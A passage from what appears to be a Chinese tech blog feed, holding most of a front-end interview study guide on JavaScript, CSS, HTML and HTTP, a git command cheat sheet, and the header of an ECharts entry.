Sub(val)&#123; Super.call(this, val); // 核心 // ... &#125; //缺点： 无法实现函数复用，每个子类实例都持有一个新的fun函数，太多了就会影响性能，内存爆炸。 组合式继承123456789function Super()&#123; this.name = 'hzzly'; &#125;// 原型函数 Super.prototype.fun1 = function()&#123;&#125;; Super.prototype.fun2 = function()&#123;&#125;; //Super.prototype.fun3...function Sub()&#123; Super.call(this); // 核心 // ... &#125;Sub.prototype = new Super(); // 核心 缺点： 子类原型上有一份多余的父类实例属性，因为父类构造函数被调用了两次，生成了两份，而子类实例上的那一份屏蔽了子类原型上父类的。又是内存浪费。 寄生组合式继承123456789101112function Super()&#123; this.name = 'hzzly'; &#125;Super.prototype.fun1 = function()&#123;&#125;; Super.prototype.fun2 = function()&#123;&#125;; //Super.prototype.fun3...function Sub()&#123; Super.call(this); // 核心 // ... &#125;Sub.prototype=Object.create(Super.prototype) // 核心 Sub.prototype.constructor=Sub // 核心 es6的class继承方式class A &#123; &#125; class B extends A &#123; &#125; B.proto === A // true B.prototype.proto === A.prototype // true es6引入了class、extends、super、static(部分为ES2016标准) null和undefined的区别null是一个表示”无”的对象，转为数值时为0；undefined是一个表示”无”的原始值，转为数值时为NaN。 undefined表示”缺少值”，就是此处应该有一个值，但是还没有定义。 null表示”没有对象”，即该处不应该有值。 call、apply、bind的区别三者都是用来改变函数的this对象的指向的。 三者第一个参数都是this要指向的对象，也就是想指定的上下文。 call 传入的参数数量不固定，第二部分参数要一个一个传，用，隔开。 apply 接受两个参数，第二个参数为一个带下标的集合，可以为数组，也可以为类数组。 bind 是返回一个改变了上下文的函数副本，便于稍后调用；apply 、call 则是立即调用。 本地存储 sessionStorage和localStorage的区别本地存储 sessionStorage用于本地存储一个会话（session）中的数据，这些数据只有在同一个会话中的页面才能访问并且当会话结束后数据也随之销毁。因此sessionStorage不是一种持久化的本地存储，仅仅是会话级别的存储。 localStorage用于持久化的本地存储，除非主动删除数据，否则数据是永远不会过期的。 cookie 和session的区别cookie数据存放在客户的浏览器上，session数据放在服务器上。 cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session。 session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用COOKIE。 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie。每次请求一个新的页面的时候Cookie都会被发送过去，与服务器进行交互。 XML和JSON的区别？数据体积方面：JSON相对于XML来讲，数据的体积小，传递的速度更快些。 列表项目：JSON与JavaScript的交互更加方便，更容易解析处理，更好的数据交互。 数据描述方面：JSON对数据的描述性比XML较差。 传输速度方面：JSON的速度要远远快于XML。 如何实现浏览器内多个标签页之间的通信?调用localstorge、cookies等本地存储方式 线程与进程的区别一个程序至少有一个进程,一个进程至少有一个线程。 线程的划分尺度小于进程，使得多线程程序的并发性高。 进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。 渐进增强和优雅降级渐进增强：针对低版本浏览器进行构建页面，保证最基本的功能，然后再针对高级浏览器进行效果、交互等改进和追加功能达到更好的用户体验。 优雅降级：一开始就构建完整的功能，然后再针对低版本浏览器进行兼容。 性能优化网页内容 减少 http请求次数 减少 DNS查询次数 避免页面跳转 缓存 Ajax 延迟加载 提前加载 减少 DOM元素数量 避免 404 服务器 使用CDN(内容分发网络) 添加Expires或Cache-Control报文头 Gzip压缩传输文件 CSS 将样式表置顶 用代替@import JavaScript 把脚本置于页面底部 使用外部JavaScript和CSS 精简JavaScript和CSS 去除重复脚本 减少DOM访问 图片 优化图像 优化CSS Spirite 不要在HTML中缩放图片 favicon.ico要小而且可缓存 如何解决跨域问题?jsonp CORS document.domain+iframe window.name window.postMessage jsonp的原理是动态插入script标签 请解释一下 JavaScript 的同源策略这里的同源策略指的是：协议，域名，端口相同，同源策略是一种安全协议。指一段脚本只能读取来自同一来源的窗口和文档的属性。 哪些操作会造成内存泄漏？内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。 垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。 setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。闭包、控制台日志、循环（在两个对象彼此引用且彼此保留时，就会产生一个循环） Javascript垃圾回收方法标记清除：这是JavaScript最常见的垃圾回收方式，当变量进入执行环境的时候，比如函数中声明一个变量，垃圾回收器将其标记为“进入环境”，当变量离开环境的时候（函数执行结束）将其标记为“离开环境”。 引用计数：引用计数的策略是跟踪记录每个值被使用的次数，当声明了一个 变量并将一个引用类型赋值给该变量的时候这个值的引用次数就加1，如果该变量的值变成了另外一个，则这个值得引用次数减1，当这个值的引用次数变为0的时 候，说明没有变量在使用，这个值没法被访问了，因此可以将其占用的空间回收，这样垃圾回收器会在运行的时候清理掉引用次数为0的值占用的空间。 事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件。阻止冒泡：ev.stopPropagation() 说说严格模式的限制变量必须声明后再使用 函数的参数不能有同名属性，否则报错 禁止this指向全局对象 不能使用with语句 增加了保留字 arguments不会自动反映函数参数的变化 设立”严格模式”的目的：消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为; 消除代码运行的一些不安全之处，保证代码运行的安全； 提高编译器效率，增加运行速度； 为未来新版本的Javascript做好铺垫。 请解释什么是事件代理事件代理（Event Delegation），又称之为事件委托。即是把原本需要绑定的事件委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。使用事件代理的好处是可以提高性能。 Event Loop、消息队列、事件轮询异步函数在执行结束后，会在事件队列中添加一个事件（回调函数）(遵循先进先出原则)，主线程中的代码执行完毕后（即一次循环结束），下一次循环开始就在事件队列中“读取”事件，然后调用它所对应的回调函数。这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环） 主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码（同步任务）调用各种外部API，它们在”任务队列”中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取”任务队列”，依次执行那些事件所对应的回调函数。 执行栈中的代码（同步任务），总是在读取”任务队列”（异步任务）之前执行。 缓存浏览器缓存（Browser Caching）是浏览器端保存数据用于快速读取或避免重复资源请求的优化机制，有效的缓存使用可以避免重复的网络请求和浏览器快速地读取本地数据。 http缓存：http缓存是基于HTTP协议的浏览器文件级缓存机制。即针对文件的重复请求情况下，浏览器可以根据协议头判断从服务器端请求文件还是从本地读取文件判断expires，如果未过期，直接读取http缓存文件 indexDB：是一个在客户端存储可观数量的结构化数据,并且为这些数据添加索引进行高性能检索。 cookie：指一般网站为了辨别用户身份、储存在用户本地终端上的数据（通常经过加密）。cookie一般通过http请求中在头部一起发送到服务器端。一条cookie记录主要由键、值、域、过期时间、大小组成，一般用户保存用户的认证信息。 localstorage：localStorage是h5的一种新的本地缓存方案,加快下次页面打开时的渲染速度,除非主动删除数据，否则数据是永远不会过期的。 sessionstorage：也是h5的一种本地缓存方案，数据的存储仅特定于某个会话中，也就是说数据只保持到浏览器关闭，当浏览器关闭后重新打开这个页面时， 之前的存储已经被清除。 ES6ES6的了解es6是一个新的标准，它包含了许多新的语言特性和库，是JS最实质性的一次升级。比如’箭头函数’、’字符串模板’、’generators(生成器)’、’async/await’、’解构赋值’、’class’等等，还有就是引入module模块的概念。 箭头函数可以让this指向固定化，这种特性很有利于封装回调函数。 (1) 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象。 (2) 不可以当作构造函数，也就是说，不可以使用new命令，否则会抛出一个错误。 (3) 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用Rest参数代替。 (4) 不可以使用yield命令，因此箭头函数不能用作Generator函数。 async/await是写异步代码的新方式，以前的方法有回调函数和Promise。async/await是基于Promise实现的，它不能用于普通的回调函数。 async/await与Promise一样，是非阻塞的。 async/await使得异步代码看起来像同步代码，这正是它的魔力所在。 说说你对Promise的理解Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件监听——更合理和更强大。 所谓Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。从语法上说，Promise 是一个对象，从它可以获取异步操作的消息。Promise 提供统一的 API，各种异步操作都可以用同样的方法进行处理。Promise对象有以下两个特点:对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：Pending（进行中）、Resolved（已完成，又称 Fulfilled）和Rejected（已失败） 一旦状态改变，就不会再变，任何时候都可以得到这个结果 说说你对AMD和Commonjs的理解CommonJS是服务器端模块的规范，Node.js采用了这个规范。CommonJS规范加载模块是同步的，也就是说，只有加载完成，才能执行后面的操作。AMD规范则是非同步加载模块，允许指定回调函数。AMD推荐的风格通过返回一个对象做为模块对象，CommonJS的风格通过对module.exports或exports的属性赋值来达到暴露模块对象的目的。 Gulp、Webpack比较GulpGulp就是为了规范前端开发流程，实现前后端分离、模块化开发、版本控制、文件合并与压缩、mock数据等功能的一个前端自动化构建工具。 Gulp就像是一个产品的流水线，整个产品从无到有，都要受流水线的控制，在流水线上我们可以对产品进行管理。 Gulp是通过task对整个开发过程进行构建。 Webpack当下最热门的前端资源模块化管理和打包工具 可以很好的管理模块以及各个模块之间的依赖 对js、css、图片等资源文件都支持打包 有独立的配置文件webpack.config.js 可以将代码切割成不同的chunk，实现按需加载，降低了初始化时间 可以生成优化且合并后的静态资源 两大特色： 代码可以自动完成编译 loader 可以处理各种类型的静态文件，并且支持串联操作 CSSdisplay:none和visibility:hidden的区别？display:none 隐藏对应的元素，在文档布局中不再给它分配空间，它各边的元素会合拢，就当他从来不存在。visibility:hidden 隐藏对应的元素，但是在文档布局中仍保留原来的空间。 position:absolute和float属性的异同 A：共同点： 对内联元素设置float和absolute属性，可以让元素脱离文档流，并且可以设置其宽高。 B：不同点： float仍会占据位置，position会覆盖文档流中的其他元素。box-sizing属性 content-box：让元素维持W3C的标准盒模型。元素的宽度/高度由border + padding + content的宽度/高度决定，设置width/height属性指的是content部分的宽/高，一旦修改了元素的边框或内距，就会影响元素的盒子尺寸，就不得不重新计算元素的盒子尺寸，从而影响整个页面的布局。 border-box：让元素维持IE传统盒模型（IE6以下版本和IE6~7的怪异模式）。设置width/height属性指的是border + padding + content position的值 static 默认值：没有定位，元素出现在正常的流中。 relative：生成相对定位的元素，相对于其在普通流中的位置进行定位。 absolute：生成绝对定位的元素， 相对于最近一级的 定位不是 static 的父元素来进行定位。 fixed：（老IE不支持）生成绝对定位的元素，相对于浏览器窗口进行定位。解释下浮动和它的工作原理？清除浮动的技巧 浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 使用空标签清除浮动：这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。 使用overflow：设置overflow为hidden或者auto，给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。 - 使用after伪对象清除浮动：该方法只适用于非IE浏览器。该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素。 1#box:after&#123; content:"."; height:0; visibility:hidden; display:block; clear:both; &#125; 浮动元素引起的问题父元素的高度无法被撑开，影响与父元素同级的元素 与浮动元素同级的非浮动元素（内联元素）会跟随其后 若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构 CSS3新特性 CSS3实现圆角（border-radius） 阴影（box-shadow） 对文字加特效（text-shadow、） 线性渐变（gradient） 旋转（transform） transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);//旋转,缩放,定位,倾斜 增加了更多的CSS选择器 多背景 rgba 在CSS3中唯一引入的伪元素是::selection. 媒体查询 多栏布局 border-imageCSS spritesCSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用CSS的“background-image”，“background- repeat”，“background-position”的组合进行背景定位，background-position可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了http2。HTML说说你对语义化的理解去掉或者丢失样式的时候能够让页面呈现出清晰的结构； 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重； 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页； 便于团队开发和维护，语义化更具可读性，是下一步吧网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。Doctype作用?严格模式与混杂模式如何区分？它们有何意义? &lt;!DOCTYPE&gt; 告知浏览器的解析器用什么文档标准解析这个文档。 严格模式的排版和 JS 运作模式是以该浏览器支持的最高标准运行。 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。 &lt;!DOCTYPE&gt; 不存在或格式不正确会导致文档以混杂模式呈现。你知道多少种Doctype文档类型？该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。 HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。 XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。 Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。HTML与XHTML二者有什么区别 所有的标记都必须要有一个相应的结束标记; 所有标签的元素和属性的名字都必须使用小写; 所有的XML标记都必须合理嵌套; 所有的属性必须用引号””括起来; 把所有&lt;和&amp;特殊符号用编码表示; 给所有属性赋一个值; 不要在注释内容中使“–”; 图片必须有说明文字。html5有哪些新特性语义化更好的内容标签（header,nav,footer,aside,article,section） 音频、视频API(audio,video) 画布(Canvas) API 地理(Geolocation) API 拖拽释放(Drag and drop) API 本地离线存储 表单控件，calendar、date、time、email、url、search计算机网络HTTP请求四部分 HTTP请求的方法或动作，比如是get还是post请求； 正在请求的URL（请求的地址）； 请求头，包含一些客户端环境信息、身份验证信息等； 请求体（请求正文），可以包含客户提交的查询字符串信息、表单信息等请求头字段： Accept:text/html,image/*(告诉服务器，浏览器可以接受文本，网页图片) Accept-Charaset:ISO-8859-1 [接受字符编码：iso-8859-1] Accept-Encoding:gzip,compress[可以接受 gzip,compress压缩后数据] Accept-Language:zh-cn[浏览器支持的语言] Host:localhost:8080[浏览器要找的主机] If-Modified-Since:Tue, 09 May 2017 01:34:02 GMT[告诉服务器我这缓存中有这个文件,该文件的时间是…] User-Agent:Nozilla/4.0(Com…)[告诉服务器我的浏览器内核，客户端环境信] Cookie：[身份验证信息] Connection:close/Keep-Alive [保持链接，发完数据后，我不关闭链接] HTTP响应三部分 (1) 一个数字和文字组成的状态码，用来显示请求是成功还是失败； (2) 响应头，响应头也和请求头一样包含许多有用的信息，例如服务器类型、日期时间、内容类型和长度等； (3) 响应体（响应正文）。响应头字段： Cache-Control:[告诉浏览器如何缓存页面(因为浏览器的兼容性最好设置两个)] Connection:close/Keep-Alive [保持链接，发完数据后，我不关闭链接] Content-Type:text/html;charset=gb2312[内容格式和编码] Last-Modified:Tue,11 Juj,2017 18 18:29:20[告诉浏览器该资源上次更新时间是多少] ETag:”540-54f0d59b8b680” Expires:Fri, 26 May 2017 13:28:33 GMT [失效日期] server:apache tomcat nginx [哪种服务器]说说TCP传输的三次握手 第一次握手，客户端给服务器发送数据包（带SYN标志的数据包）。此时服务器确认自己可以接收客户端的包，而客户端不确认服务器是否接收到了自己发的数据包。 第二次握手，服务器端回复（回传一个带有SYN/ACK标志的数据包以示传达确认信息）客户端。此时客户端确认自己发的包被服务器收到，也确认自己可以正常接收服务器包，客户端对此次通信没有疑问了。服务器也可以确认自己能接收到客户端的包，但不能确认客户端能否接收自己发的包。 第三次握手，客户端回复（发送端再回传一个带ACK标志的数据包，代表“握手”结束）服务器。 客户端已经没有疑问了，服务器也确认刚刚客户端收到了自己的数据包。两边都没有问题，开始通信。为什么要三次握手：为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误。也防止了服务器端的一直等待而浪费资源; TCP作为一种可靠传输控制协议，其核心思想：既要保证数据可靠传输，又要提高传输的效率，而用三次恰恰可以满足以上两方面的需求！四次挥手主机向服务器发送一个断开连接的请求（ 不早了，我该走了 ）,发送一个FIN报文段； 服务器接到请求后发送确认收到请求的信号（ 知道了 ）回一个ACK报文段； 服务器向主机发送断开通知（ 我也该走了 ）发送FIN报文段，请求关闭连接； 主机接到断开通知后断开连接并反馈一个确认信号（ 嗯，好的 ），服务器收到确认信号后也断开连接；TCP和UDP的区别TCP（Transmission Control Protocol，传输控制协议）是基于连接的协议，也就是说，在正式收发数据前，必须和对方建立可靠的连接。一个TCP连接必须要经过三次“对话”才能建立起来。UDP（User Data Protocol，用户数据报协议）是与TCP相对应的协议。它是面向非连接的协议，它不与对方建立连接，而是直接就把数据包发送过去！UDP适用于一次只传送少量数据、对可靠性要求不高的应用环境。HTTP和HTTPSHTTP协议通常承载于TCP协议之上，在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS 默认HTTP的端口号为80，HTTPS的端口号为443 HTTPS 相对于 HTTP 性能上差点，因为多了 SSL/TLS 的几次握手和加密解密的运算处理，但是加密解密的运算处理已经可以通过特有的硬件来加速处理。什么是Etag？把Last-Modified和ETag请求的http报头一起使用，可利用客户端（例如浏览器）的缓存。ETag用于标识资源的状态，当资源发生变更时，如果其头信息中一个或者多个发生变化，或者消息实体发生变化，那么ETag也随之发生变化。浏览器下载组件的时候，会将它们存储到浏览器缓存中。如果需要再次获取相同的组件，浏览器将检查组件的缓存时间，假如已经过期，那么浏览器将发送一个条件GET请求到服务器，服务器判断缓存还有效，则发送一个304响应，告诉浏览器可以重用缓存组件。Expires和Cache-ControlExpires 用来控制缓存的失效日期 Cache-Control 用来控制网页的缓存 常见的取值有private、no-cache、max-age、must-revalidate等，默认为private。关于Http 2.0 你知道多少HTTP/2引入了“服务端推（server push）”的概念，它允许服务端在客户端需要数据之前就主动地将数据发送到客户端缓存中，从而提高性能。 HTTP/2提供更多的加密支持 HTTP/2使用多路技术，允许多个消息在一个连接上同时交差。 它增加了头压缩（header compression），因此即使非常小的请求，其请求和响应的header都只会占用很小比例的带宽。一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？ 浏览器根据请求的URL交给DNS域名反解析，找到真实IP，向服务器发起请求（TCP三次握手）； 服务器交给后台处理完成后返回数据，浏览器接收文件（HTML、JS、CSS、图象等）； 浏览器对加载到的资源（HTML、JS、CSS等）进行语法解析，建立相应的内部数据结构（如HTML的DOM）； 载入解析到的资源文件，渲染页面，完成。浏览器的渲染过程浏览器请求到HTML代码后，在生成DOM的最开始阶段，并行发起css、图片、js的请求，无论他们是否在HEAD里。浏览器会将HTML解析成一个DOM树，DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。 CSS文件下载完成，开始构建CSSOM 所有CSS文件下载完成，CSSOM构建结束后，和 DOM 一起生成 Render Tree。 有了Render Tree，浏览器已经能知道网页中有哪些节点、各个节点的CSS定义以及他们的从属关系。下一步操作就是计算出每个节点在屏幕中的位置。 最后一步，按照算出来的规则，把内容渲染到屏幕上。 以上五个步骤前3个步骤因为DOM、CSSOM、Render Tree都可能在第一次Painting后又被更新多次，比如JS修改了DOM或者CSS属性。Layout 和 Painting 也会被重复执行，除了DOM、CSSOM更新的原因外，图片下载完成后也需要调用Layout 和 Painting来更新网页。display:none 的节点不会被加入 Render Tree，而 visibility: hidden 则会，所以，如果某个节点最开始是不显示的，设为 display:none 是更优的。 一个完整的URL包括以下几部分 协议部分 域名部分 端口部分 虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止 文件名部分：从域名后的最后一个“/”开始到“？”为止 参数部分：从“？”开始到“#”为止之间的部分 锚部分：从“#”开始到最后GET和POST的区别 GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在1024字节，Get是通过地址栏来传值。 POST：一般用于修改服务器上的资源，对所发送的信息没有限制。（常用于发送表单数据，新建、修改等），Post是通过提交表单来传值。 常见HTTP状态码 1xx（临时响应）:表示临时响应并需要请求者继续执行操作的状态码。 - 2xx（成功）:表示成功处理了请求的状态码。 200（成功）：服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。 3xx（重定向）：要完成请求，需要进一步操作。 301（永久移动）：请求的网页已永久移动到新位置。 302（临时移动）：服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来响应以后的请求。 304（未修改）：自从上次请求后，请求的网页未修改过。 4xx（请求错误）：这些状态码表示请求可能出错，妨碍了服务器的处理。 400（错误请求）：服务器不理解请求的语法。 404（未找到）：服务器找不到请求的网页。 5xx（服务器错误）:这些状态码表示服务器在处理请求时发生内部错误。 500（服务器内部错误）：服务器遇到错误，无法完成请求。 503（服务不可用）：服务器目前无法使用（由于超载或停机维护）。说说网络分层里七层模型是哪七层 应用层 表示层 会话层（从上往下）（HTTP、FTP、SMTP、DNS） 传输层（TCP和UDP） 网络层（IP） 物理层 数据链路层（以太网） 304缓存服务器首先产生ETag，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。304是HTTP状态码，服务器用来标识这个文件没修改，不返回内容，浏览器在接收到个状态码后，会使用浏览器已缓存的文件http keep-alive与tcpkeep-alive http keep-alive是为了让tcp活得更久一点，以便在同一个连接上传送多个http，提高socket的效率。而tcp keep-alive是TCP的一种检测TCP连接状况的保鲜机制。常见web安全及防护原理 sql注入原理 就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 XSS 指的是攻击者往Web页面里插入恶意html标签或者javascript代码。比如：攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取cookie中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器中，而不是用户原本以为的信任站点。 CSRF CSRF是代替用户完成指定的动作，需要知道其他用户页面的代码和数据包。要完成一次CSRF攻击，受害者必须依次完成两个步骤：1、登录受信任网站A，并在本地生成Cookie。2、在不登出A的情况下，访问危险网站B。算法数组去重 建一个空对象和空数组，循环遍历需要去重的数组，判断对象有没有此属性，没有的话就给对象添加此属性，并向空数组中push这个值。 1234567//es5 function unique(arr)&#123; var obj = &#123;&#125; var result = [] for(var i in arr)&#123; if(!obj[arr[i]])&#123; obj[arr[i]] = true; result.push(arr[i]); &#125;&#125; return result; &#125;//es6 [...new Set(arr)] 排序其他对前端界面工程师这个职位是怎么样理解的?前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好实现界面交互 提升用户体验 谈谈你对重构的理解在不改变外部行为的前提下，简化结构、添加可读性，而在网站前端保持一致的行为。也就是说是在不改变UI的情况下，对网站进行优化，在扩展的同时保持一致的UI。减少代码间的耦合 让代码保持弹性 严格按规范编写代码 设计可扩展的API 代替旧有的框架、语言(如VB) 增强用户体验 通常来说对于速度的优化也包含在重构中 你遇到过比较难的技术问题是？你是如何解决的？平时是如何学习前端开发的？平时如何管理你的项目？ 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等； 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）； 页面进行标注（例如 页面 模块 开始和结束）； CSS跟HTML 分文件夹并行存放，命名都得统一（例如style.css）； JS 分文件夹存放 命名以该JS功能为准的英文翻译。 图片采用整合的 images.png png8 格式文件使用尽量整合在一起使用方便将来的管理]]></content>
      <categories>
        <category>前端 面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git常用命令清单]]></title>
    <url>%2F2018%2F08%2F18%2Fgit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95%2F</url>
    <content type="text"><![CDATA[Git有几十上百个命令，但是我们经常用到的也就那么几个基本的,要想真正熟练，还要记住更多的命令。下面基于常用的命令做一下总结。 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库12345678在当前目录新建一个Git代码库git init新建一个目录，将其初始化为Git代码库git init [project-name]下载一个项目和它的整个代码历史git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 123456789显示当前的Git配置git config --list编辑Git配置文件git config -e [--global]设置提交代码时的用户信息git config [--global] user.name "[name]"git config [--global] user.email "[email address]" 三、增加/删除文件123456789101112131415161718192021添加指定文件到暂存区git add [file1] [file2] ...添加指定目录到暂存区，包括子目录git add [dir]添加当前目录的所有文件到暂存区git add .添加每个变化前，都会要求确认对于同一个文件的多处变化，可以实现分次提交git add -p删除工作区文件，并且将这次删除放入暂存区git rm [file1] [file2] ...停止追踪指定文件，但该文件会保留在工作区git rm --cached [file]改名文件，并且将这个改名放入暂存区git mv [file-original] [file-renamed] 四、代码提交123456789101112131415161718提交暂存区到仓库区git commit -m [message]提交暂存区的指定文件到仓库区git commit [file1] [file2] ... -m [message]提交工作区自上次commit之后的变化，直接到仓库区git commit -a提交时显示所有diff信息git commit -v使用一次新的commit，替代上一次提交如果代码没有任何新变化，则用来改写上一次commit的提交信息git commit --amend -m [message]重做上一次commit，并包括指定文件的新变化git commit --amend [file1] [file2] ... 五、分支123456789101112131415161718192021222324252627282930313233343536373839404142列出所有本地分支git branch列出所有远程分支git branch -r列出所有本地分支和远程分支git branch -a新建一个分支，但依然停留在当前分支git branch [branch-name]新建一个分支，并切换到该分支git checkout -b [branch]新建一个分支，指向指定commitgit branch [branch] [commit]新建一个分支，与指定的远程分支建立追踪关系git branch --track [branch] [remote-branch]切换到指定分支，并更新工作区git checkout [branch-name]切换到上一个分支git checkout -建立追踪关系，在现有分支与指定的远程分支之间git branch --set-upstream [branch] [remote-branch]合并指定分支到当前分支git merge [branch]选择一个commit，合并进当前分支git cherry-pick [commit]删除分支git branch -d [branch-name]删除远程分支git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签1234567891011121314151617181920212223242526列出所有taggit tag新建一个tag在当前commitgit tag [tag]新建一个tag在指定commitgit tag [tag] [commit]删除本地taggit tag -d [tag]删除远程taggit push origin :refs/tags/[tagName]查看tag信息git show [tag]提交指定taggit push [remote] [tag]提交所有taggit push [remote] --tags新建一个分支，指向某个taggit checkout -b [branch] [tag] 七、查看信息12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091显示有变更的文件git status显示当前分支的版本历史git log单行显示分支提交历史git log --oneline --decorate --graph --all显示commit历史，以及每次commit发生变更的文件git log --stat搜索提交历史，根据关键词git log -S [keyword]显示某个commit之后的所有变动，每个commit占据一行git log [tag] HEAD --pretty=format:%s显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件git log [tag] HEAD --grep feature显示某个文件的版本历史，包括文件改名git log --follow [file]git whatchanged [file]显示指定文件相关的每一次diffgit log -p [file]显示过去5次提交git log -5 --pretty --oneline显示所有提交过的用户，按提交次数排序git shortlog -sn显示指定文件是什么人在什么时间修改过git blame [file]显示暂存区和工作区的差异git diff显示暂存区和上一个commit的差异git diff --cached [file]显示工作区与当前分支最新commit之间的差异git diff HEAD显示两次提交之间的差异git diff [first-branch]...[second-branch]显示今天你写了多少行代码git diff --shortstat "@&#123;0 day ago&#125;"显示某次提交的元数据和内容变化git show [commit]显示某次提交发生变化的文件git show --name-only [commit]显示某次提交时，某个文件的内容git show [commit]:[filename]显示当前分支的最近几次提交git reflog``` # 八、远程同步```javascript下载远程仓库的所有变动git fetch [remote]显示所有远程仓库git remote -v显示某个远程仓库的信息git remote show [remote]增加一个新的远程仓库，并命名git remote add [shortname] [url]取回远程仓库的变化，并与本地分支合并git pull [remote] [branch]上传本地指定分支到远程仓库git push [remote] [branch]强行推送当前分支到远程仓库，即使有冲突git push [remote] --force推送所有分支到远程仓库git push [remote] --all 九、撤销12345678910111213141516171819202122232425262728293031恢复暂存区的指定文件到工作区git checkout [file]恢复某个commit的指定文件到暂存区和工作区git checkout [commit] [file]恢复暂存区的所有文件到工作区git checkout .重置暂存区的指定文件，与上一次commit保持一致，但工作区不变git reset [file]重置暂存区与工作区，与上一次commit保持一致git reset --hard重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变git reset [commit]重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致git reset --hard [commit]重置当前HEAD为指定commit，但保持暂存区和工作区不变git reset --keep [commit]新建一个commit，用来撤销指定commit后者的所有变化都将被前者抵消，并且应用到当前分支git revert [commit]暂时将未提交的变化移除，稍后再移入git stashgit stash pop 十、其他12生成一个可供发布的压缩包git archive]]></content>
      <categories>
        <category>git&amp;github</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECharts使用过程遇到的问题汇总]]></title>
    <url>%2F2018%2F08%2F18%2FECharts%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
